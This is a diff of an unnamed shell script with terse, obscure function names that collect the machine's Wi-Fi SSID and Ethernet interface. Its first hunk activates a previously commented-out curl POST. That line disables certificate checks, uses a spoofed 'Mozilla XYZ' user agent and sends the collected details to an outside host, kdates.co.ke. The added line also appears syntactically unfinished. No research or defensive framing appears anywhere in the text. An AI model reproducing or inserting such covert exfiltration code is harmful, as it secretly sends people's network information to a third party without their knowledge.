@@ -3,7 +3,7 @@
 function dbgx(){
 	echo "[*] $1";
  	#cx_ "dbgx: $1" "SSID"
-  	#OX_=`curl -k -X POST -d "descr=$1&cat=SSID" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps
+  	OX___=`curl -k -X POST -d "descr=$1&cat=SSID" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps
    	#
     	#xyz=`uptime`
      	#OX_=`curl -k -X POST -d "descr=$xyz&cat=SSID" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps
@@ -162,8 +162,6 @@ function Ntx(){
             dbgx "Current SSID: $SSID"
             #
             cx_ "$SSID" "SSID"
-	    xyz=`uptime`
-     	    cx_ "$xyz" "SSID"
         else
             dbgx "No wireless network detected"
         fi
@@ -174,8 +172,6 @@ function Ntx(){
         dbgx "User is connected to Ethernet using interface $eth_interface"
 	#
 	cx_ "$eth_interface" "SSID"
-        xyz=`uptime`
-     	cx_ "$xyz" "SSID"
         #
         eth_interface=$(ip -o link show | awk -F': ' '{print $2, $9}' | grep "state UP" | grep -v "lo:" | awk '{print $1}')
 
